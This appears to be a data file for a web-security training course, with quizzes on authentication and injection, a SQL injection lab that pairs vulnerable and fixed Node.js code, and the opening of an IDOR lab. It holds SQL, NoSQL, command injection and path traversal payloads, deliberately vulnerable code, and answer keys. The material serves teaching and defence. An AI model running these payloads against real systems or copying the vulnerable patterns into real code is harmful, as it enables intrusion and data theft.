        explanation: "Rainbow table attacks use precomputed hash values to quickly reverse hash functions and discover passwords. Salting passwords (which bcrypt does automatically) makes rainbow tables ineffective.",
        category: "Authentication"
      },
      {
        question: "In OAuth 2.0, what is the role of the 'authorization code' flow?",
        type: "multiple_choice" as const,
        options: [
          { id: "a", text: "Store passwords securely" },
          { id: "b", text: "Exchange an authorization code for an access token via a secure backend channel" },
          { id: "c", text: "Encrypt database connections" },
          { id: "d", text: "Hash user passwords" }
        ],
        correctAnswers: ["b"],
        explanation: "The authorization code flow is the most secure OAuth 2.0 flow for web applications. It exchanges a short-lived authorization code for an access token through a secure server-to-server request, keeping tokens out of the browser.",
        category: "Authentication"
      },
      {
        question: "Session fixation attacks can be prevented by regenerating session IDs after successful login.",
        type: "true_false" as const,
        options: [
          { id: "true", text: "True" },
          { id: "false", text: "False" }
        ],
        correctAnswers: ["true"],
        explanation: "Regenerating the session ID after authentication prevents session fixation attacks, where an attacker tricks a user into using a session ID the attacker already knows.",
        category: "Authentication"
      },
      {
        question: "What is the main security risk of storing session tokens in URLs (e.g., ?sessionId=abc123)?",
        type: "multiple_choice" as const,
        options: [
          { id: "a", text: "Slower page load times" },
          { id: "b", text: "URLs are logged in browser history, server logs, and referrer headers, exposing tokens" },
          { id: "c", text: "Increases database load" },
          { id: "d", text: "Prevents caching" }
        ],
        correctAnswers: ["b"],
        explanation: "URLs containing session tokens are logged everywhere (browser history, web server logs, proxy logs, referrer headers) and can be bookmarked or shared, exposing the session. Always use httpOnly cookies for session management.",
        category: "Authentication"
      },
      {
        question: "Which bcrypt function should you use to hash a password during user registration?",
        type: "multiple_choice" as const,
        options: [
          { id: "a", text: "bcrypt.compare()" },
          { id: "b", text: "bcrypt.hash()" },
          { id: "c", text: "bcrypt.decrypt()" },
          { id: "d", text: "bcrypt.encode()" }
        ],
        correctAnswers: ["b"],
        explanation: "bcrypt.hash(password, saltRounds) generates a secure hash of the password with an automatically generated salt. This hashed value should be stored in the database, never the plain password.",
        category: "Authentication"
      },
      {
        question: "What is the purpose of 'salt' in password hashing?",
        type: "multiple_choice" as const,
        options: [
          { id: "a", text: "Make passwords taste better" },
          { id: "b", text: "Add random data to each password before hashing to prevent rainbow table attacks" },
          { id: "c", text: "Compress the password hash" },
          { id: "d", text: "Encrypt the password before storage" }
        ],
        correctAnswers: ["b"],
        explanation: "A salt is random data added to each password before hashing, ensuring that identical passwords produce different hashes. This defeats rainbow table attacks and makes it harder to crack multiple passwords simultaneously.",
        category: "Authentication"
      },
      {
        question: "Multi-factor authentication (MFA) only provides security if the second factor is also a password.",
        type: "true_false" as const,
        options: [
          { id: "true", text: "True" },
          { id: "false", text: "False" }
        ],
        correctAnswers: ["false"],
        explanation: "MFA requires factors from different categories: something you know (password), something you have (phone/token), or something you are (biometric). Using two passwords is NOT true multi-factor authentication.",
        category: "Authentication"
      },
      {
        question: "In a session-based authentication system, where should the session data be stored for scalability?",
        type: "multiple_choice" as const,
        options: [
          { id: "a", text: "In the cookie sent to the client" },
          { id: "b", text: "In a centralized session store like Redis or a database" },
          { id: "c", text: "In the application's process memory only" },
          { id: "d", text: "In the user's localStorage" }
        ],
        correctAnswers: ["b"],
        explanation: "For scalable applications (especially with multiple servers), session data should be stored in a centralized session store like Redis or a database. This allows any server to access the session data.",
        category: "Authentication"
      },
      {
        question: "What is the difference between stateful and stateless authentication?",
        type: "multiple_choice" as const,
        options: [
          { id: "a", text: "Stateful stores session data server-side; stateless stores auth data in the token (e.g., JWT)" },
          { id: "b", text: "Stateless is less secure than stateful" },
          { id: "c", text: "Stateful uses cookies; stateless uses headers" },
          { id: "d", text: "There is no difference" }
        ],
        correctAnswers: ["a"],
        explanation: "Stateful authentication stores session data on the server and sends a session ID to the client. Stateless authentication (like JWT) embeds user information in the token itself, requiring no server-side storage.",
        category: "Authentication"
      },
      {
        question: "Why is bcrypt preferred over SHA-256 for password hashing?",
        type: "multiple_choice" as const,
        options: [
          { id: "a", text: "bcrypt is faster than SHA-256" },
          { id: "b", text: "bcrypt is adaptive (slow) and includes automatic salting, while SHA-256 is fast and designed for data integrity" },
          { id: "c", text: "SHA-256 cannot hash long passwords" },
          { id: "d", text: "bcrypt produces shorter hashes" }
        ],
        correctAnswers: ["b"],
        explanation: "bcrypt is intentionally slow and computationally expensive, making brute-force attacks costly. It also automatically handles salting. SHA-256 is fast (designed for data integrity), making it unsuitable for passwords without additional protections.",
        category: "Authentication"
      },
      {
        question: "The 'secure' cookie flag is only necessary for cookies containing session tokens, not other cookies.",
        type: "true_false" as const,
        options: [
          { id: "true", text: "True" },
          { id: "false", text: "False" }
        ],
        correctAnswers: ["false"],
        explanation: "The 'secure' flag should be used for ALL cookies that contain sensitive data, not just session tokens. This includes authentication cookies, preference cookies with sensitive settings, and any other confidential information.",
        category: "Authentication"
      },
      {
        question: "What is the primary security benefit of using OAuth 2.0 over traditional username/password authentication?",
        type: "multiple_choice" as const,
        options: [
          { id: "a", text: "OAuth 2.0 is faster" },
          { id: "b", text: "Applications never receive or store user passwords; delegation of authentication to a trusted provider" },
          { id: "c", text: "OAuth 2.0 doesn't require HTTPS" },
          { id: "d", text: "OAuth 2.0 eliminates the need for session management" }
        ],
        correctAnswers: ["b"],
        explanation: "OAuth 2.0's main security advantage is that third-party applications never handle user passwords. Users authenticate with a trusted provider (like Google), which issues tokens to applications, reducing password exposure and liability.",
        category: "Authentication"
      },
      {
        question: "When a user logs out, what should happen to their session to prevent session hijacking?",
        type: "multiple_choice" as const,
        options: [
          { id: "a", text: "Nothing, just redirect to login page" },
          { id: "b", text: "Clear the cookie on the client side only" },
          { id: "c", text: "Destroy the session server-side AND clear the cookie client-side" },
          { id: "d", text: "Set session expiry to 1 hour" }
        ],
        correctAnswers: ["c"],
        explanation: "Proper logout requires destroying the session on the server (so the session ID is invalidated) AND clearing the cookie on the client side. Only clearing the client-side cookie leaves the session active and vulnerable.",
        category: "Authentication"
      },
      {
        question: "Which sameSite cookie value provides the strongest CSRF protection but may break some legitimate cross-site functionality?",
        type: "multiple_choice" as const,
        options: [
          { id: "a", text: "sameSite: 'None'" },
          { id: "b", text: "sameSite: 'Lax'" },
          { id: "c", text: "sameSite: 'Strict'" },
          { id: "d", text: "sameSite: 'Secure'" }
        ],
        correctAnswers: ["c"],
        explanation: "sameSite: 'Strict' provides maximum CSRF protection by never sending cookies in cross-site requests, but this can break legitimate features like clicking links from emails or external sites.",
        category: "Authentication"
      },
      {
        question: "Plain text password storage is acceptable if the database is encrypted.",
        type: "true_false" as const,
        options: [
          { id: "true", text: "True" },
          { id: "false", text: "False" }
        ],
        correctAnswers: ["false"],
        explanation: "Never store passwords in plain text, even in encrypted databases. Database encryption protects against disk theft but doesn't protect against SQL injection, insider threats, or application-level breaches. Always hash passwords with bcrypt.",
        category: "Authentication"
      },
      {
        question: "What is 'timing attack' vulnerability in authentication, and how does bcrypt.compare() help prevent it?",
        type: "multiple_choice" as const,
        options: [
          { id: "a", text: "Attacks based on response time differences; bcrypt.compare() uses constant-time comparison" },
          { id: "b", text: "Attacks during specific times of day; bcrypt adds random delays" },
          { id: "c", text: "Attacks that exploit session timeouts; bcrypt extends session duration" },
          { id: "d", text: "Timing attacks are not relevant to authentication" }
        ],
        correctAnswers: ["a"],
        explanation: "Timing attacks analyze how long password comparisons take to infer information about the password. bcrypt.compare() uses constant-time comparison algorithms that take the same time regardless of how many characters match, preventing this attack.",
        category: "Authentication"
      },
      {
        question: "In a JWT-based authentication system, where should you store the JWT on the client side for maximum security?",
        type: "multiple_choice" as const,
        options: [
          { id: "a", text: "localStorage" },
          { id: "b", text: "sessionStorage" },
          { id: "c", text: "httpOnly cookie" },
          { id: "d", text: "In-memory JavaScript variable" }
        ],
        correctAnswers: ["c"],
        explanation: "httpOnly cookies provide the best security for JWTs because they're inaccessible to JavaScript (preventing XSS attacks). While in-memory storage also prevents XSS, it's lost on page refresh. localStorage/sessionStorage are vulnerable to XSS.",
        category: "Authentication"
      },
      {
        question: "What is the recommended session timeout duration for a high-security banking application?",
        type: "multiple_choice" as const,
        options: [
          { id: "a", text: "24 hours" },
          { id: "b", text: "1 hour" },
          { id: "c", text: "15 minutes of inactivity" },
          { id: "d", text: "No timeout needed if using HTTPS" }
        ],
        correctAnswers: ["c"],
        explanation: "High-security applications like banking should use short inactivity timeouts (typically 10-15 minutes) to minimize the window for session hijacking if a user leaves their device unattended. The session should be destroyed after this idle period.",
        category: "Authentication"
      }
    ]
  },
  {
    number: 3,
    title: "Input Validation & Injection Prevention",
    duration: "2h",
    description: "Prevent SQL injection, XSS, and command injection",
    subparts: [
      "3.1.1 SQL injection patterns",
      "3.1.2 XSS attack vectors",
      "3.1.3 Command injection",
      "3.1.4 Input sanitization strategies"
    ],
    learningOutcomes: [
      "Prevent SQL injection attacks",
      "Mitigate XSS vulnerabilities",
      "Validate and sanitize input properly",
    ],
    lab: {
      title: "ShopHub Product Search - SQL Injection Attack & Fix",
      description: "ShopHub's product search feature is vulnerable to SQL injection! Attackers can extract the entire customer database. Your mission: exploit the vulnerability to understand the impact, then fix it using parameterized queries.",
      estimatedTime: 40,
      instructions: `**Story**: You're a security consultant hired by ShopHub, an e-commerce marketplace. A customer reported that they could see other users' orders by manipulating the product search URL. Initial investigation reveals a critical SQL injection vulnerability!

**The Vulnerability**:
The product search feature concatenates user input directly into SQL queries, allowing attackers to:
- Extract all customer data (names, emails, addresses)
- Bypass authentication and access admin accounts
- Modify or delete database records
- Execute arbitrary SQL commands

**Your Penetration Testing Mission**:

**PHASE 1 - Exploit (Proof of Concept)**:
1. **Test** the search with: \`' OR '1'='1\` to retrieve all products
2. **Extract** customer emails using UNION injection: \`' UNION SELECT email, password FROM users --\`
3. **Document** what data you can access

**PHASE 2 - Code Analysis**:
1. **Identify** where the vulnerability exists in the code below
2. **Understand** why string concatenation is dangerous

**PHASE 3 - Secure Fix**:
1. **Replace** string concatenation with parameterized queries
2. **Implement** input validation (allowlist for product IDs)
3. **Test** that injection payloads no longer work

**Expected Solution**: Use parameterized/prepared statements with ? placeholders instead of string concatenation.`,
      vulnerableCode: [
        {
          filename: "database.js",
          language: "javascript",
          code: `const mysql = require('mysql2');
const express = require('express');
const app = express();

// ShopHub E-commerce Database - VULNERABLE VERSION
const db = mysql.createConnection({
  host: 'localhost',
  user: 'root',
  password: 'password',
  database: 'shophub'
});

// VULNERABILITY: SQL Injection via String Concatenation
function searchProducts(searchTerm) {
  // DANGEROUS: User input concatenated directly into SQL!
  const query = "SELECT * FROM products WHERE name LIKE '%" + searchTerm + "%'";
  
  console.log('Executing query:', query);
  return db.query(query);
}

// VULNERABILITY: SQL Injection in product detail lookup
function getProductById(productId) {
  // DANGEROUS: No input validation + string concatenation
  const query = 'SELECT * FROM products WHERE id = ' + productId;
  return db.query(query);
}

// VULNERABILITY: SQL Injection in user orders
function getUserOrders(userId) {
  // DANGEROUS: Attacker can inject: 1 OR 1=1
  const query = \`SELECT * FROM orders WHERE user_id = \${userId}\`;
  return db.query(query);
}

// VULNERABILITY: NoSQL injection in MongoDB version
function searchProductsMongo(category) {
  // DANGEROUS: Object injection
  return db.collection('products').find({
    category: { $ne: null }  // Attacker can inject: { $ne: null }
  });
}

// API Endpoints
app.get('/api/products/search', (req, res) => {
  const results = searchProducts(req.query.q);
  res.json(results);
});

app.get('/api/products/:id', (req, res) => {
  const product = getProductById(req.params.id);
  res.json(product);
});

app.get('/api/orders/:userId', (req, res) => {
  const orders = getUserOrders(req.params.userId);
  res.json(orders);
});

/* 
ATTACK EXAMPLES that work on this code:

1. Search: ' OR '1'='1' --
   Returns all products (bypasses LIKE filter)

2. Product ID: 1 UNION SELECT email, password FROM users --
   Extracts all user credentials

3. User Orders: 1 OR 1=1
   Returns ALL orders from ALL users

4. NoSQL: {"$ne": null}
   Returns all products regardless of category

IMPACT: Complete database compromise!
*/`
        }
      ],
      correctCode: [
        {
          filename: "database.js",
          language: "javascript",
          code: `const mysql = require('mysql2/promise');
const express = require('express');
const app = express();

// ShopHub E-commerce Database - SECURE VERSION
const pool = mysql.createPool({
  host: 'localhost',
  user: 'root',
  password: 'password',
  database: 'shophub',
  waitForConnections: true,
  connectionLimit: 10
});

// SECURITY FIX 1: Parameterized queries with ? placeholders
async function searchProducts(searchTerm) {
  // SECURE: User input passed as parameter, not concatenated
  const query = "SELECT * FROM products WHERE name LIKE ?";
  const params = ['%' + searchTerm + '%'];
  
  const [rows] = await pool.execute(query, params);
  return rows;
}

// SECURITY FIX 2: Input validation + parameterized queries
async function getProductById(productId) {
  // Validate input: ensure productId is a number
  const id = parseInt(productId, 10);
  if (isNaN(id) || id < 1) {
    throw new Error('Invalid product ID');
  }
  
  // SECURE: Parameterized query with ? placeholder
  const query = 'SELECT * FROM products WHERE id = ?';
  const [rows] = await pool.execute(query, [id]);
  return rows[0];
}

// SECURITY FIX 3: Type validation + parameterized queries
async function getUserOrders(userId) {
  // Validate that userId is a positive integer
  const id = parseInt(userId, 10);
  if (isNaN(id) || id < 1) {
    throw new Error('Invalid user ID');
  }
  
  // SECURE: Parameterized query prevents injection
  const query = 'SELECT * FROM orders WHERE user_id = ?';
  const [rows] = await pool.execute(query, [id]);
  return rows;
}

// SECURITY FIX 4: NoSQL injection prevention with explicit type coercion
async function searchProductsMongo(category, db) {
  // Validate input: ensure category is a string, not an object
  if (typeof category !== 'string') {
    throw new Error('Invalid category type');
  }
  
  // SECURE: Use explicit $eq operator and String() coercion
  return db.collection('products').find({
    category: { $eq: String(category) }
  });
}

// SECURITY FIX 5: Additional sanitization helper
function sanitizeInput(input) {
  if (typeof input !== 'string') {
    return String(input);
  }
  // Remove potentially dangerous characters
  return input.replace(/[;\\x00-\\x1F\\x7F]/g, '');
}

// API Endpoints with validation
app.get('/api/products/search', async (req, res) => {
  try {
    const searchTerm = sanitizeInput(req.query.q || '');
    const results = await searchProducts(searchTerm);
    res.json(results);
  } catch (error) {
    res.status(400).json({ error: 'Invalid search query' });
  }
});

app.get('/api/products/:id', async (req, res) => {
  try {
    const product = await getProductById(req.params.id);
    if (!product) {
      return res.status(404).json({ error: 'Product not found' });
    }
    res.json(product);
  } catch (error) {
    res.status(400).json({ error: 'Invalid product ID' });
  }
});

app.get('/api/orders/:userId', async (req, res) => {
  try {
    const orders = await getUserOrders(req.params.userId);
    res.json(orders);
  } catch (error) {
    res.status(400).json({ error: 'Invalid user ID' });
  }
});

/* 
SECURITY IMPROVEMENTS:
✓ Parameterized queries with ? placeholders (SQL injection prevention)
✓ pool.execute() used instead of concatenation-based queries
✓ Input validation with parseInt() and type checking
✓ NoSQL injection prevented with explicit $eq and String() coercion
✓ Error handling prevents information leakage
✓ Sanitization helper removes dangerous characters
✓ Try-catch blocks handle invalid input gracefully

ATTACK EXAMPLES (now blocked):
1. Search: ' OR '1'='1' -- → Treated as literal string, no injection
2. Product ID: 1 UNION SELECT... → Rejected by parseInt validation
3. User Orders: 1 OR 1=1 → Rejected by parseInt validation
4. NoSQL: {"$ne": null} → Rejected by typeof check

COMPLETE PROTECTION from SQL/NoSQL injection!
*/`
        }
      ],
      validationCriteria: [
        {
          header: "Parameterized Queries (SQL)",
          description: "Replace string concatenation with ? placeholders and parameter arrays",
          expectedPattern: "query.*\\?.*\\[.*\\]",
          required: true
        },
        {
          header: "Prepared Statements",
          description: "Use db.execute() or prepared statements instead of db.query() with concatenation",
          expectedPattern: "execute|prepare",
          required: true
        },
        {
          header: "Input Validation",
          description: "Validate and sanitize user input (type checking, allowlist validation)",
          expectedPattern: "parseInt|Number|isNaN|validate|sanitize",
          required: true
        },
        {
          header: "NoSQL Safe Queries",
          description: "For MongoDB, use explicit field matching instead of accepting raw objects",
          expectedPattern: "category:.*String|\\$eq",
          required: false
        }
      ],
      learningOutcomes: [
        "Understand SQL injection attack vectors and impact",
        "Exploit SQL injection vulnerabilities (ethical hacking for learning)",
        "Identify vulnerable code patterns (string concatenation in SQL)",
        "Implement parameterized queries and prepared statements",
        "Validate and sanitize user input properly",
        "Protect against NoSQL injection in MongoDB"
      ],
      hints: [
        "Hint 1: Parameterized query syntax: db.execute('SELECT * FROM products WHERE id = ?', [productId])",
        "Hint 2: NEVER concatenate user input into SQL: 'WHERE id = ' + userId (WRONG)",
        "Hint 3: Validate numeric IDs: const id = parseInt(req.params.id, 10); if (isNaN(id)) return error;",
        "Hint 4: For LIKE queries: db.execute('SELECT * FROM products WHERE name LIKE ?', ['%' + searchTerm + '%'])",
        "Hint 5: NoSQL fix: db.collection('products').find({ category: { $eq: String(category) } })",
        "SOLUTION: Replace ALL string concatenation with parameterized queries using ? placeholders"
      ]
    },
    quizzes: [
      {
        question: "What is the primary defense against SQL injection attacks?",
        type: "multiple_choice" as const,
        options: [
          { id: "a", text: "Input length validation" },
          { id: "b", text: "Parameterized queries with prepared statements" },
          { id: "c", text: "Blacklist filtering of special characters" },
          { id: "d", text: "WAF (Web Application Firewall)" }
        ],
        correctAnswers: ["b"],
        explanation: "Parameterized queries (prepared statements) separate SQL logic from data, preventing attackers from injecting malicious SQL code. This is the most effective defense against SQL injection.",
        category: "Injection Prevention"
      },
      {
        question: "Which SQL injection payload retrieves all records by bypassing a WHERE clause?",
        type: "multiple_choice" as const,
        options: [
          { id: "a", text: "' OR '1'='1' --" },
          { id: "b", text: "<script>alert('XSS')</script>" },
          { id: "c", text: "'; DROP TABLE users; --" },
          { id: "d", text: "../../../etc/passwd" }
        ],
        correctAnswers: ["a"],
        explanation: "' OR '1'='1' -- is a classic SQL injection that makes the WHERE clause always evaluate to true, returning all records. The -- comments out the rest of the query.",
        category: "Injection Prevention"
      },
      {
        question: "What type of XSS occurs when malicious scripts are stored in a database and displayed to other users?",
        type: "multiple_choice" as const,
        options: [
          { id: "a", text: "Reflected XSS" },
          { id: "b", text: "Stored/Persistent XSS" },
          { id: "c", text: "DOM-based XSS" },
          { id: "d", text: "SQL XSS" }
        ],
        correctAnswers: ["b"],
        explanation: "Stored (Persistent) XSS occurs when malicious scripts are saved to the database (e.g., in comment fields) and executed when other users view the data. This is the most dangerous XSS type.",
        category: "XSS Prevention"
      },
      {
        question: "Which code snippet is vulnerable to SQL injection?",
        type: "multiple_choice" as const,
        options: [
          { id: "a", text: "db.execute('SELECT * FROM users WHERE id = ?', [userId])" },
          { id: "b", text: "db.query('SELECT * FROM users WHERE id = ' + userId)" },
          { id: "c", text: "db.prepare('SELECT * FROM users WHERE id = ?').run(userId)" },
          { id: "d", text: "db.query('SELECT * FROM users WHERE id = $1', [userId])" }
        ],
        correctAnswers: ["b"],
        explanation: "Option B concatenates user input directly into the SQL string, allowing SQL injection. Options A, C, and D use parameterized queries which are secure.",
        category: "Injection Prevention"
      },
      {
        question: "Encoding user output before rendering it in HTML prevents XSS attacks.",
        type: "true_false" as const,
        options: [
          { id: "true", text: "True" },
          { id: "false", text: "False" }
        ],
        correctAnswers: ["true"],
        explanation: "Output encoding (HTML entity encoding) converts dangerous characters like < > into &lt; &gt;, preventing browsers from executing malicious scripts. This is a critical XSS defense.",
        category: "XSS Prevention"
      },
      {
        question: "What is the difference between HTML encoding and URL encoding?",
        type: "multiple_choice" as const,
        options: [
          { id: "a", text: "They are the same thing" },
          { id: "b", text: "HTML encoding converts < > & to entities; URL encoding converts spaces and special chars to %XX" },
          { id: "c", text: "URL encoding prevents XSS; HTML encoding does not" },
          { id: "d", text: "HTML encoding is only for databases" }
        ],
        correctAnswers: ["b"],
        explanation: "HTML encoding (&lt; &gt; &amp;) prevents XSS in HTML context. URL encoding (%20 %3D) ensures safe transmission of data in URLs. Use the right encoding for the right context.",
        category: "Input Sanitization"
      },
      {
        question: "Which command injection payload could allow an attacker to list files on a Unix system?",
        type: "multiple_choice" as const,
        options: [
          { id: "a", text: "filename.txt; ls -la" },
          { id: "b", text: "<script>alert('XSS')</script>" },
          { id: "c", text: "' OR 1=1 --" },
          { id: "d", text: "../../etc/passwd" }
        ],
        correctAnswers: ["a"],
        explanation: "Command injection uses shell metacharacters like ; & | to execute additional commands. 'filename.txt; ls -la' would execute 'ls -la' after the intended command.",
        category: "Injection Prevention"
      },
      {
        question: "What is a UNION-based SQL injection attack?",
        type: "multiple_choice" as const,
        options: [
          { id: "a", text: "Joining tables together for faster queries" },
          { id: "b", text: "Using UNION to append malicious query results to legitimate query results" },
          { id: "c", text: "A type of XSS attack" },
          { id: "d", text: "Combining multiple SQL injections" }
        ],
        correctAnswers: ["b"],
        explanation: "UNION-based SQL injection uses the UNION SQL operator to combine the results of the original query with results from an attacker-controlled query, allowing data extraction from other tables.",
        category: "Injection Prevention"
      },
      {
        question: "Input validation on the client side only is sufficient for security.",
        type: "true_false" as const,
        options: [
          { id: "true", text: "True" },
          { id: "false", text: "False" }
        ],
        correctAnswers: ["false"],
        explanation: "Client-side validation can be bypassed (browser DevTools, proxies, custom requests). ALWAYS validate input on the server side. Client-side validation is for UX only, not security.",
        category: "Input Validation"
      },
      {
        question: "Which approach prevents XSS when displaying user-generated content?",
        type: "multiple_choice" as const,
        options: [
          { id: "a", text: "innerHTML = userInput" },
          { id: "b", text: "textContent = userInput" },
          { id: "c", text: "eval(userInput)" },
          { id: "d", text: "document.write(userInput)" }
        ],
        correctAnswers: ["b"],
        explanation: "textContent treats input as plain text, not HTML, preventing XSS. innerHTML, eval(), and document.write() can execute malicious scripts. Always use textContent for untrusted data.",
        category: "XSS Prevention"
      },
      {
        question: "What is the purpose of Content Security Policy (CSP) nonces in preventing XSS?",
        type: "multiple_choice" as const,
        options: [
          { id: "a", text: "Encrypt inline scripts" },
          { id: "b", text: "Allow specific inline scripts with a cryptographic nonce while blocking others" },
          { id: "c", text: "Prevent SQL injection" },
          { id: "d", text: "Hash passwords" }
        ],
        correctAnswers: ["b"],
        explanation: "CSP nonces are random values added to <script> tags and the CSP header. Only scripts with matching nonces execute, allowing legitimate inline scripts while blocking injected ones.",
        category: "XSS Prevention"
      },
      {
        question: "Which NoSQL injection payload bypasses authentication by exploiting MongoDB's $ne operator?",
        type: "multiple_choice" as const,
        options: [
          { id: "a", text: "username: 'admin', password: 'password123'" },
          { id: "b", text: "username: {$ne: null}, password: {$ne: null}" },
          { id: "c", text: "username: 'admin' OR '1'='1'" },
          { id: "d", text: "username: '<script>alert(1)</script>'" }
        ],
        correctAnswers: ["b"],
        explanation: "MongoDB NoSQL injection uses operators like {$ne: null} (not equal to null) to bypass authentication. This returns true for any existing user if the application doesn't validate input types.",
        category: "Injection Prevention"
      },
      {
        question: "Whitelist validation is generally more secure than blacklist validation for input filtering.",
        type: "true_false" as const,
        options: [
          { id: "true", text: "True" },
          { id: "false", text: "False" }
        ],
        correctAnswers: ["true"],
        explanation: "Whitelists (allowlists) define what IS allowed, which is more secure than blacklists that try to block every possible attack. Attackers constantly find new bypass techniques for blacklists.",
        category: "Input Validation"
      },
      {
        question: "What is the safest way to execute shell commands with user input in Node.js?",
        type: "multiple_choice" as const,
        options: [
          { id: "a", text: "exec(`ping ${userInput}`)" },
          { id: "b", text: "execFile('ping', [userInput], options)" },
          { id: "c", text: "system('ping ' + userInput)" },
          { id: "d", text: "eval('ping ' + userInput)" }
        ],
        correctAnswers: ["b"],
        explanation: "execFile() with an array of arguments prevents command injection by not invoking a shell. exec() and system() are vulnerable because they parse shell metacharacters.",
        category: "Injection Prevention"
      },
      {
        question: "Which character is commonly used in SQL injection to comment out the rest of a query?",
        type: "multiple_choice" as const,
        options: [
          { id: "a", text: "//" },
          { id: "b", text: "#" },
          { id: "c", text: "--" },
          { id: "d", text: ";" }
        ],
        correctAnswers: ["c"],
        explanation: "-- (double dash) is the SQL comment syntax that comments out everything after it. Attackers use this to remove password checks: ' OR 1=1 -- makes 'WHERE password=' ineffective.",
        category: "Injection Prevention"
      },
      {
        question: "DOMPurify is a library that sanitizes HTML to prevent XSS attacks.",
        type: "true_false" as const,
        options: [
          { id: "true", text: "True" },
          { id: "false", text: "False" }
        ],
        correctAnswers: ["true"],
        explanation: "DOMPurify is a DOM-only XSS sanitizer that removes dangerous HTML/JS while preserving safe HTML. It's recommended for sanitizing rich text input before rendering.",
        category: "XSS Prevention"
      },
      {
        question: "What is 'second-order SQL injection'?",
        type: "multiple_choice" as const,
        options: [
          { id: "a", text: "Running two SQL injections simultaneously" },
          { id: "b", text: "Injecting malicious data that's stored and later used unsafely in a different SQL query" },
          { id: "c", text: "A type of XSS attack" },
          { id: "d", text: "SQL injection that only works on Tuesdays" }
        ],
        correctAnswers: ["b"],
        explanation: "Second-order SQL injection stores malicious payloads in the database (e.g., username = \"admin'--\"), which later cause injection when used in another query without sanitization.",
        category: "Injection Prevention"
      },
      {
        question: "Which HTTP header can help prevent reflected XSS attacks in legacy browsers?",
        type: "multiple_choice" as const,
        options: [
          { id: "a", text: "X-XSS-Protection: 1; mode=block" },
          { id: "b", text: "Strict-Transport-Security" },
          { id: "c", text: "X-Frame-Options" },
          { id: "d", text: "Access-Control-Allow-Origin" }
        ],
        correctAnswers: ["a"],
        explanation: "X-XSS-Protection enables browser XSS filters that detect reflected XSS patterns. Modern browsers deprecated it in favor of CSP, but it still helps with legacy browsers.",
        category: "XSS Prevention"
      },
      {
        question: "Path traversal attacks (../) are a type of injection vulnerability.",
        type: "true_false" as const,
        options: [
          { id: "true", text: "True" },
          { id: "false", text: "False" }
        ],
        correctAnswers: ["true"],
        explanation: "Path traversal (directory traversal) is an injection attack where attackers inject '../' sequences to access files outside the intended directory (e.g., ../../etc/passwd).",
        category: "Injection Prevention"
      },
      {
        question: "What is the purpose of using prepared statements in SQL?",
        type: "multiple_choice" as const,
        options: [
          { id: "a", text: "Improve query performance by caching execution plans" },
          { id: "b", text: "Prevent SQL injection by separating SQL code from data" },
          { id: "c", text: "Both A and B" },
          { id: "d", text: "Encrypt SQL queries" }
        ],
        correctAnswers: ["c"],
        explanation: "Prepared statements provide both security (preventing SQL injection by treating parameters as data, not code) and performance (query plan caching and reuse).",
        category: "Injection Prevention"
      },
      {
        question: "Which validation library for Node.js provides schema-based input validation?",
        type: "multiple_choice" as const,
        options: [
          { id: "a", text: "Joi" },
          { id: "b", text: "helmet.js" },
          { id: "c", text: "bcrypt" },
          { id: "d", text: "express-session" }
        ],
        correctAnswers: ["a"],
        explanation: "Joi is a powerful schema description and data validation library for JavaScript. It allows you to define validation rules for request data (type, format, range, etc.).",
        category: "Input Validation"
      },
      {
        question: "Template injection is similar to SQL injection but targets template engines instead of databases.",
        type: "true_false" as const,
        options: [
          { id: "true", text: "True" },
          { id: "false", text: "False" }
        ],
        correctAnswers: ["true"],
        explanation: "Template injection (SSTI - Server-Side Template Injection) occurs when user input is embedded in template engines (Jinja2, Handlebars) without proper escaping, allowing code execution.",
        category: "Injection Prevention"
      },
      {
        question: "What is 'blind SQL injection'?",
        type: "multiple_choice" as const,
        options: [
          { id: "a", text: "SQL injection where the attacker cannot see query results directly" },
          { id: "b", text: "SQL injection that only works in the dark" },
          { id: "c", text: "Injection that affects blind users' screen readers" },
          { id: "d", text: "A completely random injection attempt" }
        ],
        correctAnswers: ["a"],
        explanation: "Blind SQL injection occurs when the application doesn't return query results or errors. Attackers infer data through timing delays or boolean conditions (true/false responses).",
        category: "Injection Prevention"
      },
      {
        question: "Which technique should you use to safely include user input in JSON responses?",
        type: "multiple_choice" as const,
        options: [
          { id: "a", text: "Directly concatenate strings: '{\"name\":\"' + userName + '\"}'" },
          { id: "b", text: "Use JSON.stringify() with validated data" },
          { id: "c", text: "Use eval() to parse the JSON" },
          { id: "d", text: "No special handling needed for JSON" }
        ],
        correctAnswers: ["b"],
        explanation: "JSON.stringify() properly escapes special characters, preventing JSON injection and XSS when JSON is embedded in HTML. Never concatenate strings to build JSON manually.",
        category: "Input Sanitization"
      },
      {
        question: "LDAP injection and XML injection are also types of injection vulnerabilities similar to SQL injection.",
        type: "true_false" as const,
        options: [
          { id: "true", text: "True" },
          { id: "false", text: "False" }
        ],
        correctAnswers: ["true"],
        explanation: "LDAP injection (directory services) and XML injection (XXE - XML External Entity) are similar to SQL injection - they exploit unsafe handling of user input in queries/parsers. The same parameterization principles apply.",
        category: "Injection Prevention"
      }
    ]
  },
  {
    number: 4,
    title: "Access Control & Authorization",
    duration: "2h",
    description: "Implement proper authorization and access control",
    subparts: [
      "4.1.1 RBAC patterns",
      "4.1.2 Attribute-based access control",
      "4.1.3 Broken access control vulnerabilities",
      "4.1.4 API authorization"
    ],
    learningOutcomes: [
      "Implement role-based access control",
      "Prevent broken access control",
      "Secure API endpoints",
    ],
    lab: {
      title: "CloudDocs File Sharing - IDOR & Broken Access Control",
      description: "CloudDocs has a critical IDOR vulnerability! Users can access other people's private files by changing document IDs in the URL. Your mission: exploit the vulnerability, then implement proper authorization checks.",
      estimatedTime: 35,
      instructions: `**Story**: You're a security engineer at CloudDocs, a file sharing service. A journalist just published an article revealing that any user can access anyone else's private documents by simply changing the document ID in the URL! This is an IDOR (Insecure Direct Object Reference) vulnerability.

**The Breach**:
- User with ID 1 can access User 2's private medical records
- Changing /api/documents/5 to /api/documents/6 exposes others' files
- No authorization checks - only authentication
- Admin-only endpoints accessible to regular users

**Your Ethical Hacking Mission**:

**PHASE 1 - Exploit IDOR**:
1. **Test** as user Alice (id:1): Access /api/documents/1 (her file) ✓
2. **Exploit** IDOR: Change URL to /api/documents/2 (Bob's private file!)
3. **Escalate**: Try accessing /api/admin/users (admin-only endpoint)
4. **Document** all unauthorized data you can access

**PHASE 2 - Code Analysis**:
1. **Identify** all missing authorization checks in the code below
2. **Map** which endpoints need: authentication vs authorization vs ownership checks

**PHASE 3 - Implement Authorization**:
1. **Add** ownership verification for document access
2. **Implement** RBAC for admin endpoints (role='admin' check)
3. **Verify** users can only delete their OWN documents
4. **Test** that IDOR exploits no longer work

